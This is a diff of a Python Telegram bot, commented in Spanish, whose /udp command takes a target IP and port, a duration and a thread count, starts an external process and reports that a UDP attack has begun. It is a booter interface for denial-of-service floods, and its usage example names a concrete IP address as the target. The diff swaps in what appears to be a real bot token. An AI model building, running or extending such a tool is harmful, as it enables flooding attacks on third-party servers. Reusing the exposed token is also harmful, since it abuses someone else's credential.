@@ -3,14 +3,14 @@ from telegram.ext import Application, CommandHandler, ContextTypes
 import subprocess
 
 # Token del bot (obtén el token de @BotFather en Telegram)
-TOKEN = "7807495947:AAGvrDQJ0WpnjXLFPhkDsdOB6ql2m7rN0hc"
+TOKEN = "6908755926:AAGJIq3ID6OacIDPVgU1safZhTjLfNnR89Y"
 
 # Comando para iniciar un ataque UDP
 async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Verifica que el usuario haya ingresado los parámetros necesarios
     if len(context.args) < 3:
         await update.message.reply_text(
-            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999"
+            "Uso: /udp <IP:Puerto> <Duración> <Threads>\nEjemplo: /udp 143.92.114.176:10015 53 999 :)"
         )
         return
 
@@ -26,7 +26,7 @@ async def udp_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         process = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         await update.message.reply_text(
-            f"Ataque UDP iniciada:\n- Target: {target}\n- Duración: {duration} segundos\n- Threads: {threads}"
+            f"Ataque UDP iniciado:\n- Target: {target}\n- Duración: {duration} \n- Threads: {threads}"
         )
     except Exception as e:
         await update.message.reply_text(f"Error al ejecutar el comando:\n{str(e)}")
